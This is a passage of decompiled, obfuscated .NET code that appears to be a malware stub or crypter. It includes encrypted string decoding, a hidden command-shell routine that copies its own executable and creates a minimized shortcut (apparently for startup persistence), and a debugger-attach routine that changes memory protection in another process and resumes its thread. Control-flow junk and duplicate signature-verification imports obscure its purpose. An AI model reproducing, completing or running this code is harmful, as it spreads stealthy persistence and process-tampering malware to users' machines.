				Class12.smethod_56(stream, (int)(30 + bytes.Length + totalOut));
				Class12.smethod_44(0, stream);
				stream.Seek(position3, SeekOrigin.Begin);
				Class12.smethod_56(stream, (int)totalOut);
				break;
			}
			case 1:
			{
				Class12.smethod_56(stream, 25000571);
				Class12.smethod_56(stream, byte_2.Length);
				byte[] array5;
				for (int i = 0; i < byte_2.Length; i += array5.Length)
				{
					array5 = new byte[Math.Min(2097151, byte_2.Length - i)];
					Buffer.BlockCopy(byte_2, i, array5, 0, array5.Length);
					long position = stream.Position;
					Class12.smethod_56(stream, 0);
					Class12.smethod_56(stream, array5.Length);
					Class33.Class39 @class = new Class33.Class39();
					Class12.smethod_41(@class, array5);
					while (!@class.IsNeedingInput)
					{
						byte[] array6 = new byte[512];
						int num = Class12.smethod_124(array6, @class);
						if (num <= 0)
						{
							break;
						}
						stream.Write(array6, 0, num);
					}
					Class12.smethod_146(@class);
					while (!@class.IsFinished)
					{
						byte[] array7 = new byte[512];
						int num2 = Class12.smethod_124(array7, @class);
						if (num2 <= 0)
						{
							break;
						}
						stream.Write(array7, 0, num2);
					}
					long position2 = stream.Position;
					stream.Position = position;
					Class12.smethod_56(stream, (int)@class.TotalOut);
					stream.Position = position2;
				}
				break;
			}
			case 2:
			{
				Class12.smethod_56(stream, 41777787);
				byte[] array3 = Class12.smethod_18((byte[])null, (byte[])null, 1, byte_2);
				using (ICryptoTransform cryptoTransform2 = Class12.smethod_99(bool_0: false, byte_0, byte_1))
				{
					byte[] array4 = cryptoTransform2.TransformFinalBlock(array3, 0, array3.Length);
					stream.Write(array4, 0, array4.Length);
				}
				break;
			}
			case 3:
			{
				Class12.smethod_56(stream, 58555003);
				byte[] array = Class12.smethod_18((byte[])null, (byte[])null, 1, byte_2);
				using (ICryptoTransform cryptoTransform = Class12.smethod_85(byte_1, bool_0: false, byte_0))
				{
					byte[] array2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
					stream.Write(array2, 0, array2.Length);
				}
				break;
			}
			}
			stream.Flush();
			stream.Close();
			return stream.ToArray();
		}
		catch (Exception ex)
		{
			Class33.string_0 = "ERR 2003: " + ex.Message;
			throw;
		}
	}

	static void smethod_19(Class33.Class36 class36_0, int int_0)
	{
		if (class36_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class36_0.byte_0[class36_0.int_0++] = (byte)int_0;
		class36_0.int_0 &= 32767;
	}

	static void smethod_20(Form1 form1_0)
	{
		((Control)form1_0).SuspendLayout();
		((Control)form1_0.button_1).set_Anchor((AnchorStyles)10);
		((ButtonBase)form1_0.button_1).set_FlatStyle((FlatStyle)3);
		((Control)form1_0.button_1).set_Size(new Size(100, 24));
		((Control)form1_0.button_1).set_Location(new Point(408 - ((Control)form1_0.button_1).get_Width(), 188));
		((Control)form1_0.button_1).set_TabIndex(0);
		((Control)form1_0.button_1).set_Text(Class32.smethod_0(991));
		((Control)form1_0.button_1).add_Click((EventHandler)form1_0.method_1);
		((Control)form1_0.button_0).set_Anchor((AnchorStyles)10);
		((ButtonBase)form1_0.button_0).set_FlatStyle((FlatStyle)3);
		((Control)form1_0.button_0).set_Size(new Size(100, 24));
		((Control)form1_0.button_0).set_Location(new Point(((Control)form1_0.button_1).get_Left() - ((Control)form1_0.button_0).get_Width() - 6, 188));
		((Control)form1_0.button_0).set_TabIndex(1);
		((Control)form1_0.button_0).set_Text(Class32.smethod_0(1000));
		((Control)form1_0.button_0).add_Click((EventHandler)form1_0.method_0);
		((Control)form1_0.control2_0).set_Anchor((AnchorStyles)6);
		((Control)form1_0.control2_0).SetBounds(6, 186, 120, 32);
		form1_0.control1_0.IconState = Enum5.const_2;
		((Control)form1_0.class55_0).set_Anchor((AnchorStyles)13);
		((Control)form1_0.class55_0).set_Location(new Point(20, 72));
		((Control)form1_0.class55_0).set_Size(new Size(382, 13));
		((Form)form1_0).set_AutoScaleBaseSize(new Size(5, 13));
		((Form)form1_0).set_ClientSize(new Size(418, 224));
		((Form)form1_0).set_ControlBox(false);
		((Control)form1_0).get_Controls().AddRange((Control[])(object)new Control[5]
		{
			form1_0.control2_0,
			(Control)form1_0.button_0,
			(Control)form1_0.button_1,
			form1_0.control1_0,
			(Control)form1_0.class55_0
		});
		((Form)form1_0).set_FormBorderStyle((FormBorderStyle)1);
		((Form)form1_0).set_MaximizeBox(false);
		((Form)form1_0).set_MinimizeBox(false);
		((Form)form1_0).set_ShowInTaskbar(false);
		((Form)form1_0).set_StartPosition((FormStartPosition)1);
		((Control)form1_0).ResumeLayout(false);
	}

	static int smethod_21(Class33.Class36 class36_0, Class33.Class35 class35_0, int int_0)
	{
		int_0 = Math.Min(Math.Min(int_0, 32768 - class36_0.int_1), class35_0.AvailableBytes);
		int num = 32768 - class36_0.int_0;
		int num2;
		if (int_0 > num)
		{
			num2 = Class12.smethod_111(class35_0, class36_0.byte_0, class36_0.int_0, num);
			if (num2 == num)
			{
				num2 += Class12.smethod_111(class35_0, class36_0.byte_0, 0, int_0 - num);
			}
		}
		else
		{
			num2 = Class12.smethod_111(class35_0, class36_0.byte_0, class36_0.int_0, int_0);
		}
		class36_0.int_0 = (class36_0.int_0 + num2) & 0x7FFF;
		class36_0.int_1 += num2;
		return num2;
	}

	static bool smethod_22(EventArgs1 eventArgs1_0)
	{
		if (!eventArgs1_0.bool_1)
		{
			return false;
		}
		return eventArgs1_0.class47_0.method_7();
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_3([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static void smethod_23()
	{
		try
		{
			Class12.smethod_25();
		}
		catch (Exception)
		{
		}
	}

	static Type smethod_24(Class51 class51_0)
	{
		return class51_0.type_0;
	}

	[DllImport("kernel32")]
	internal static extern bool MoveFileEx(string string_0, string string_1, int int_0);

	static void smethod_25()
	{
		try
		{
			AppDomain.CurrentDomain.AssemblyResolve += Class12.smethod_123;
		}
		catch
		{
		}
	}

	static void smethod_26(Control0 control0_0)
	{
		Class12.smethod_1(string.Empty, control0_0);
	}

	static void smethod_27(Control0 control0_0)
	{
		control0_0.timer_0.set_Enabled(false);
		control0_0.image_0 = null;
		control0_0.bool_0 = false;
		control0_0.string_0 = string.Empty;
		((Control)control0_0).Refresh();
		((Control)control0_0).set_Height(16);
	}

	static void smethod_28(Exception exception_0)
	{
		Class12.smethod_138(exception_0, new object[0]);
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_4([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static int smethod_29(Class33.Class37 class37_0, Class33.Class35 class35_0)
	{
		int num;
		int num2;
		if ((num = Class12.smethod_133(class35_0, 9)) >= 0)
		{
			if ((num2 = class37_0.short_0[num]) >= 0)
			{
				Class12.smethod_30(class35_0, num2 & 0xF);
				return num2 >> 4;
			}
			int num3 = -(num2 >> 4);
			int int_ = num2 & 0xF;
			if ((num = Class12.smethod_133(class35_0, int_)) >= 0)
			{
				num2 = class37_0.short_0[num3 | (num >> 9)];
				Class12.smethod_30(class35_0, num2 & 0xF);
				return num2 >> 4;
			}
			int availableBits = class35_0.AvailableBits;
			num = Class12.smethod_133(class35_0, availableBits);
			num2 = class37_0.short_0[num3 | (num >> 9)];
			if ((num2 & 0xF) <= availableBits)
			{
				Class12.smethod_30(class35_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		int availableBits2 = class35_0.AvailableBits;
		num = Class12.smethod_133(class35_0, availableBits2);
		num2 = class37_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= availableBits2)
		{
			Class12.smethod_30(class35_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	[DllImport("user32", CharSet = CharSet.Unicode)]
	internal static extern int DrawText(IntPtr intptr_0, string string_0, int int_0, ref Class59.Struct23 struct23_0, int int_1);

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_5([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static void smethod_30(Class33.Class35 class35_0, int int_0)
	{
		class35_0.uint_0 >>= int_0;
		class35_0.int_2 -= int_0;
	}

	static void smethod_31(Class33.Class40.Class41 class41_0, int int_0)
	{
		Class12.smethod_144(class41_0.class40_0.class43_0, class41_0.short_1[int_0] & 0xFFFF, (int)class41_0.byte_0[int_0]);
	}

	static void smethod_32()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		string text = default(string);
		object executablePath = default(object);
		StreamWriter standardInput = default(StreamWriter);
		string text5 = default(string);
		string text6 = default(string);
		string text7 = default(string);
		string text8 = default(string);
		string text9 = default(string);
		object objectValue = default(object);
		object objectValue2 = default(object);
		object obj = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				string text4;
				string text10;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 2536:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0049;
						case 4:
							goto IL_0076;
						case 5:
							goto IL_0080;
						case 6:
							goto IL_00ca;
						case 7:
							goto IL_00e9;
						case 8:
							goto IL_00f2;
						case 9:
							goto IL_0101;
						case 10:
							goto IL_0111;
						case 11:
							goto IL_0193;
						case 12:
							goto IL_01ad;
						case 13:
							goto IL_01be;
						case 14:
							goto IL_01cf;
						case 15:
							goto IL_01e0;
						case 16:
							goto IL_01f1;
						case 17:
							goto IL_0202;
						case 18:
							goto IL_0212;
						case 19:
							goto IL_021e;
						case 20:
							goto IL_022e;
						case 21:
							goto IL_023a;
						case 22:
							goto IL_0249;
						case 23:
							goto IL_0259;
						case 24:
							goto IL_0269;
						case 25:
							goto IL_0274;
						case 26:
							goto IL_0284;
						case 27:
							goto IL_0294;
						case 28:
							goto IL_0331;
						case 29:
							goto IL_0349;
						case 30:
							goto IL_03c6;
						case 32:
							goto IL_03d9;
						case 33:
							goto IL_03dd;
						case 34:
							goto IL_0460;
						case 35:
							goto IL_0470;
						case 36:
							goto IL_0487;
						case 37:
							goto IL_04ab;
						case 38:
							goto IL_04d6;
						case 39:
							goto IL_0553;
						case 40:
							goto IL_05d0;
						case 41:
							goto IL_064d;
						case 42:
							goto IL_0679;
						case 43:
							goto IL_069a;
						case 44:
							goto IL_06bb;
						case 31:
						case 45:
						case 46:
							goto IL_073d;
						case 47:
							goto IL_07af;
						case 48:
							goto IL_0830;
						case 49:
						case 50:
							goto IL_08bb;
						case 51:
							goto IL_08d9;
						case 52:
							goto IL_08e4;
						case 53:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 54:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_08e4:
					num = 52;
					process.Kill();
					break;
					IL_0008:
					num = 2;
					text = Class32.smethod_0(1013) + Interaction.Environ(Class12.smethod_38(Class32.smethod_0(1014))) + Class12.smethod_38(Class32.smethod_0(1047)) + Class32.smethod_0(1013);
					goto IL_0049;
					IL_0049:
					num = 3;
					text2 = Interaction.Environ(Class12.smethod_38(Class32.smethod_0(1014))) + Class12.smethod_38(Class32.smethod_0(1108));
					goto IL_0076;
					IL_0076:
					num = 4;
					process = new Process();
					goto IL_0080;
					IL_0080:
					num = 5;
					text3 = Interaction.Environ(Class12.smethod_38(Class32.smethod_0(1014))) + Class12.smethod_38(Class32.smethod_0(1108)) + Class12.smethod_38(Class32.smethod_0(1169)) + Class12.smethod_38(Class32.smethod_0(1258));
					goto IL_00ca;
					IL_00ca:
					num = 6;
					Directory.CreateDirectory(text + Class12.smethod_38(Class32.smethod_0(1291)));
					goto IL_00e9;
					IL_00e9:
					num = 7;
					executablePath = Application.get_ExecutablePath();
					goto IL_00f2;
					IL_00f2:
					num = 8;
					Conversion.Int((object)false);
					goto IL_0101;
					IL_0101:
					num = 9;
					Conversion.Int((object)false);
					goto IL_0111;
					IL_0111:
					num = 10;
					text4 = Class32.smethod_0(1013) + Interaction.Environ(Class12.smethod_38(Class32.smethod_0(1014))) + Class12.smethod_38(Class32.smethod_0(1047)) + Class12.smethod_38(Class32.smethod_0(1291)) + Class32.smethod_0(1324) + Class12.smethod_38(Class32.smethod_0(1258));
					goto IL_0193;
					IL_0193:
					num = 11;
					process.StartInfo.FileName = Class32.smethod_0(1329);
					goto IL_01ad;
					IL_01ad:
					num = 12;
					process.StartInfo.RedirectStandardOutput = true;
					goto IL_01be;
					IL_01be:
					num = 13;
					process.StartInfo.RedirectStandardInput = true;
					goto IL_01cf;
					IL_01cf:
					num = 14;
					process.StartInfo.UseShellExecute = false;
					goto IL_01e0;
					IL_01e0:
					num = 15;
					process.StartInfo.CreateNoWindow = true;
					goto IL_01f1;
					IL_01f1:
					num = 16;
					process.StartInfo.RedirectStandardError = true;
					goto IL_0202;
					IL_0202:
					num = 17;
					Conversion.Int((object)false);
					goto IL_0212;
					IL_0212:
					num = 18;
					process.Start();
					goto IL_021e;
					IL_021e:
					num = 19;
					Conversion.Int((object)false);
					goto IL_022e;
					IL_022e:
					num = 20;
					standardInput = process.StandardInput;
					goto IL_023a;
					IL_023a:
					num = 21;
					text5 = Class32.smethod_0(1342);
					goto IL_0249;
					IL_0249:
					num = 22;
					text6 = Class32.smethod_0(1347);
					goto IL_0259;
					IL_0259:
					num = 23;
					Conversion.Int((object)false);
					goto IL_0269;
					IL_0269:
					num = 24;
					standardInput.AutoFlush = true;
					goto IL_0274;
					IL_0274:
					num = 25;
					text7 = Class32.smethod_0(1352);
					goto IL_0284;
					IL_0284:
					num = 26;
					text8 = Class32.smethod_0(1365);
					goto IL_0294;
					IL_0294:
					num = 27;
					standardInput.Write(text5 + text6 + Class32.smethod_0(1374) + Application.get_ExecutablePath() + Class32.smethod_0(1379) + text7 + Class12.smethod_38(Class32.smethod_0(1291)) + Class32.smethod_0(1324) + Class12.smethod_38(Class32.smethod_0(1258)) + Class32.smethod_0(1384) + Environment.NewLine);
					goto IL_0331;
					IL_0331:
					num = 28;
					if (Class12.smethod_117(Class32.smethod_0(1393)))
					{
						goto IL_0349;
					}
					goto IL_03d9;
					IL_0349:
					num = 29;
					standardInput.Write(Class12.smethod_38(Class32.smethod_0(1406)) + text7 + Class12.smethod_38(Class32.smethod_0(1291)) + Class32.smethod_0(1324) + Class12.smethod_38(Class32.smethod_0(1258)) + Class32.smethod_0(1580) + Environment.NewLine);
					goto IL_03c6;
					IL_03c6:
					num = 30;
					Thread.Sleep(7000);
					goto IL_073d;
					IL_03d9:
					num = 32;
					goto IL_03dd;
					IL_03dd:
					num = 33;
					standardInput.Write(Class12.smethod_38(Class32.smethod_0(1406)) + text7 + Class12.smethod_38(Class32.smethod_0(1291)) + Class32.smethod_0(1324) + Class12.smethod_38(Class32.smethod_0(1258)) + text8 + Class32.smethod_0(1580) + Environment.NewLine);
					goto IL_0460;
					IL_0460:
					num = 34;
					text9 = Class32.smethod_0(1589);
					goto IL_0470;
					IL_0470:
					num = 35;
					text10 = text9 + Class32.smethod_0(1598);
					goto IL_0487;
					IL_0487:
					num = 36;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(Class32.smethod_0(1013), Class32.smethod_0(1013)));
					goto IL_04ab;
					IL_04ab:
					num = 37;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(text9 + Class32.smethod_0(1598), Class32.smethod_0(1013)));
					goto IL_04d6;
					IL_04d6:
					num = 38;
					objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, Class32.smethod_0(1611), new object[1] { text + Class12.smethod_38(Class32.smethod_0(1291)) + Class32.smethod_0(1324) + Class12.smethod_38(Class32.smethod_0(1258)) + text8 }, (string[])null, (Type[])null, (bool[])null));
					goto IL_0553;
					IL_0553:
					num = 39;
					NewLateBinding.LateSet(objectValue2, (Type)null, Class32.smethod_0(1632), new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, Class32.smethod_0(1649), new object[1] { text + Class12.smethod_38(Class32.smethod_0(1291)) + Class32.smethod_0(1324) + Class12.smethod_38(Class32.smethod_0(1258)) }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					goto IL_05d0;
					IL_05d0:
					num = 40;
					NewLateBinding.LateSet(obj, (Type)null, Class32.smethod_0(1632), new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, Class32.smethod_0(1649), new object[1] { text + Class12.smethod_38(Class32.smethod_0(1291)) + Class32.smethod_0(1324) + Class12.smethod_38(Class32.smethod_0(1258)) }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					goto IL_064d;
					IL_064d:
					num = 41;
					NewLateBinding.LateSet(objectValue2, (Type)null, Class32.smethod_0(1682), new object[1] { 4 }, (string[])null, (Type[])null);
					goto IL_0679;
					IL_0679:
					num = 42;
					NewLateBinding.LateCall(objectValue2, (Type)null, Class32.smethod_0(1699), new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_069a;
					IL_069a:
					num = 43;
					NewLateBinding.LateCall(obj, (Type)null, Class32.smethod_0(1699), new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_06bb;
					IL_06bb:
					num = 44;
					standardInput.Write(Class12.smethod_38(Class32.smethod_0(1708)) + text7 + Class12.smethod_38(Class32.smethod_0(1291)) + Class32.smethod_0(1324) + Class12.smethod_38(Class32.smethod_0(1258)) + Class12.smethod_38(Class32.smethod_0(1797)) + Environment.NewLine);
					goto IL_073d;
					IL_073d:
					num = 46;
					if (!File.Exists(Interaction.Environ(Class32.smethod_0(1858)) + Class32.smethod_0(1324) + Class12.smethod_38(Class32.smethod_0(1291)) + Class32.smethod_0(1324) + Class12.smethod_38(Class32.smethod_0(1258))))
					{
						goto IL_07af;
					}
					goto IL_08bb;
					IL_07af:
					num = 47;
					File.Copy(Conversions.ToString(executablePath), Interaction.Environ(Class32.smethod_0(1858)) + Class32.smethod_0(1324) + Class12.smethod_38(Class32.smethod_0(1291)) + Class32.smethod_0(1324) + Class12.smethod_38(Class32.smethod_0(1258)) + Class32.smethod_0(1867));
					goto IL_0830;
					IL_0830:
					num = 48;
					standardInput.Write(Class32.smethod_0(1876) + text7 + Class12.smethod_38(Class32.smethod_0(1291)) + Class32.smethod_0(1324) + Class12.smethod_38(Class32.smethod_0(1258)) + Class32.smethod_0(1885) + Class12.smethod_38(Class32.smethod_0(1258)) + Environment.NewLine);
					goto IL_08bb;
					IL_08bb:
					num = 50;
					standardInput.Write(Class32.smethod_0(1894) + Environment.NewLine);
					goto IL_08d9;
					IL_08d9:
					num = 51;
					process.WaitForExit();
					goto IL_08e4;
					end_IL_0000_2:
					break;
				}
				num = 53;
				standardInput.Flush();
				break;
				end_IL_0000:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0000_dispatch = 2536;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static Icon smethod_33()
	{
		try
		{
			return Class12.smethod_72();
		}
		catch (Exception)
		{
			return Class12.smethod_60(Class32.smethod_0(1903));
		}
	}

	static void smethod_34(uint uint_0, int int_0, Class21.Struct0 struct0_0)
	{
		Class21.Delegate11 @delegate = Class18.smethod_1<Class21.Delegate11>(Class12.smethod_86(Class32.smethod_0(1916)), Class12.smethod_86(Class32.smethod_0(1949)));
		Class21.Delegate12 delegate2 = Class18.smethod_1<Class21.Delegate12>(Class12.smethod_86(Class32.smethod_0(1916)), Class12.smethod_86(Class32.smethod_0(2010)));
		Class21.Delegate13 delegate3 = Class18.smethod_1<Class21.Delegate13>(Class12.smethod_86(Class32.smethod_0(1916)), Class12.smethod_86(Class32.smethod_0(2071)));
		Class21.Delegate14 delegate4 = Class18.smethod_1<Class21.Delegate14>(Class12.smethod_86(Class32.smethod_0(1916)), Class12.smethod_86(Class32.smethod_0(2132)));
		Class21.Delegate2 delegate5 = Class18.smethod_1<Class21.Delegate2>(Class12.smethod_86(Class32.smethod_0(1916)), Class12.smethod_86(Class32.smethod_0(2193)));
		Class21.Delegate10 delegate6 = Class18.smethod_1<Class21.Delegate10>(Class12.smethod_86(Class32.smethod_0(2254)), Class12.smethod_86(Class32.smethod_0(2287)));
		checked
		{
			if (!@delegate((int)struct0_0.uint_0))
			{
				throw new Exception();
			}
			delegate3(KillOnExit: false);
			uint lpflOldProtect = 64u;
			bool flag = true;
			while (true)
			{
				if (flag)
				{
					Class21.Struct2 lpDebugEvent = default(Class21.Struct2);
					if (!delegate2(out lpDebugEvent, -1))
					{
						break;
					}
					switch (lpDebugEvent.enum1_0)
					{
					case Class21.Enum1.const_2:
						if (lpDebugEvent.Exception.struct5_0.uint_0 == 2147483649u)
						{
							delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
							if (!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
							{
								throw new Exception(Class32.smethod_0(2320));
							}
							break;
						}
						delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
						goto IL_02eb;
					case Class21.Enum1.const_0:
						try
						{
							if (!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
							{
								if (eDGT3VIwkRhN3e5ONQ())
								{
									switch (2)
									{
									case 0:
									case 2:
										break;
									default:
										goto IL_0221;
									}
								}
								throw new Exception(Class32.smethod_0(2349));
							}
							if (!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
							{
								goto IL_0221;
							}
							goto end_IL_01b9;
							IL_0221:
							throw new Exception(Class32.smethod_0(2349));
							end_IL_01b9:;
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							if (!delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
							{
								throw new Exception(Class32.smethod_0(2374));
							}
							ProjectData.ClearProjectError();
						}
						if (delegate5(struct0_0.intptr_0, uint_0, int_0, 320u, ref lpflOldProtect))
						{
							uint SuspendCount = 0u;
							if (delegate6(struct0_0.intptr_1, out SuspendCount) != -1)
							{
								Thread.Sleep(1000);
								delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
								goto IL_02eb;
							}
							throw new Exception(Class32.smethod_0(2399));
						}
						throw new Exception(Class32.smethod_0(2374));
					default:
						delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 65538);
						goto IL_02eb;
					case Class21.Enum1.const_3:
						{
							flag = false;
							delegate4(lpDebugEvent.int_0, lpDebugEvent.int_1, 1073807364);
							goto IL_02eb;
						}
						IL_02eb:
						GC.Collect();
						break;
					}
					continue;
				}
				try
				{
					Process.GetProcessById((int)struct0_0.uint_0).Kill();
					Process.GetCurrentProcess().Kill();
					return;
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					ProjectData.ClearProjectError();
					return;
				}
			}
			throw new Exception();
		}
	}

	static void smethod_35(Exception exception_0, object object_0, object object_1, object object_2, object object_3)
	{
		Class12.smethod_138(exception_0, new object[4] { object_0, object_1, object_2, object_3 });
	}

	static void smethod_36(Class33.Class40.Class41 class41_0, Class33.Class40.Class41 class41_1)
	{
		int num = -1;
		int num2 = 0;
		while (num2 < class41_1.int_1)
		{
			int num3 = 1;
			int num4 = class41_1.byte_0[num2];
			while (true)
			{
				IL_00f7:
				int num5;
				int num6;
				if (num4 != 0)
				{
					num5 = 6;
					num6 = 3;
					if (num != num4)
					{
						goto IL_00d6;
					}
					goto IL_00eb;
				}
				goto IL_00e2;
				IL_00d6:
				Class12.smethod_31(class41_0, num4);
				num3 = 0;
				goto IL_00eb;
				IL_00eb:
				while (true)
				{
					IL_00eb_2:
					num = num4;
					num2++;
					while (num2 < class41_1.int_1 && num == class41_1.byte_0[num2])
					{
						num2++;
						if (++num3 >= num5)
						{
							break;
						}
					}
					while (true)
					{
						int num7;
						if (num3 >= num6)
						{
							if (num != 0)
							{
								Class12.smethod_31(class41_0, 16);
								Class12.smethod_144(class41_1.class40_0.class43_0, num3 - 3, 2);
								goto end_IL_00f7;
							}
							if (num3 <= 10)
							{
								Class12.smethod_31(class41_0, 17);
								Class12.smethod_144(class41_1.class40_0.class43_0, num3 - 3, 3);
								goto end_IL_00f7;
							}
							Class12.smethod_31(class41_0, 18);
							Class12.smethod_144(class41_1.class40_0.class43_0, num3 - 11, 7);
							num7 = 10;
							if (!HOU2tiJgKu5JybMaDZ())
							{
							}
						}
						else
						{
							num7 = 8;
							if (!eDGT3VIwkRhN3e5ONQ())
							{
								break;
							}
						}
						switch (num7)
						{
						case 0:
							break;
						case 3:
							goto end_IL_00ce;
						case 2:
						case 4:
							goto IL_00e2;
						default:
							goto IL_00eb_2;
						case 1:
						case 7:
							goto IL_00f7;
						case 8:
							while (num3-- > 0)
							{
								Class12.smethod_31(class41_0, num);
							}
							goto end_IL_00f7;
						case 5:
						case 6:
						case 10:
							goto end_IL_00f7;
						}
						continue;
						end_IL_00ce:
						break;
					}
					break;
				}
				goto IL_00d6;
				IL_00e2:
				num5 = 138;
				num6 = 3;
				goto IL_00eb;
				continue;
				end_IL_00f7:
				break;
			}
		}
	}

	static void smethod_37(Exception exception_0, object[] object_0)
	{
		try
		{
			if ((object)exception_0.GetType() == typeof(Exception))
			{
				if (eDGT3VIwkRhN3e5ONQ())
				{
					switch (2)
					{
					case 0:
					case 2:
						break;
					default:
						goto IL_0053;
					case 4:
						goto IL_0064;
					}
					if (!(exception_0.Message == Class32.smethod_0(2428)))
					{
						goto IL_005d;
					}
				}
				goto IL_0053;
			}
			goto IL_005d;
			IL_0053:
			exception_0 = exception_0.InnerException;
			goto IL_0064;
			IL_005d:
			Class12.smethod_138(exception_0, object_0);
			goto IL_0064;
			IL_0064:
			Class56.Handler.method_3(exception_0, bool_1: true, bool_2: true);
		}
		catch
		{
		}
	}

	static string smethod_38(string string_0)
	{
		string s = Class32.smethod_0(2441);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = Class32.smethod_0(1013);
		string result = default(string);
		try
		{
			byte[] array = new byte[32];
			while (true)
			{
				byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(s));
				while (true)
				{
					Array.Copy(sourceArray, 0, array, 0, 10);
					Array.Copy(sourceArray, 0, array, 15, 10);
					rijndaelManaged.Key = array;
					rijndaelManaged.Mode = CipherMode.ECB;
					while (true)
					{
						ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
						byte[] array2 = Convert.FromBase64String(string_0);
						if (HOU2tiJgKu5JybMaDZ())
						{
						}
						switch (2)
						{
						case 1:
						case 4:
							goto end_IL_002d;
						case 0:
						case 5:
							goto end_IL_006c;
						case 2:
							text = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
							goto case 6;
						case 6:
							result = text;
							return result;
						}
						continue;
						end_IL_002d:
						break;
					}
					continue;
					end_IL_006c:
					break;
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	static void smethod_39(Class33.Class36 class36_0, int int_0, int int_1)
	{
		if ((class36_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class36_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class36_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class36_0.byte_0, num, class36_0.byte_0, class36_0.int_0, int_0);
				class36_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class36_0.byte_0[class36_0.int_0++] = class36_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class12.smethod_121(class36_0, num, int_0, int_1);
		}
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_6([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static void smethod_40(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4)
	{
		Class12.smethod_138(exception_0, new object[5] { object_0, object_1, object_2, object_3, object_4 });
	}

	static void smethod_41(Class33.Class39 class39_0, byte[] byte_0)
	{
		Class12.smethod_161(class39_0.class42_0, byte_0);
	}

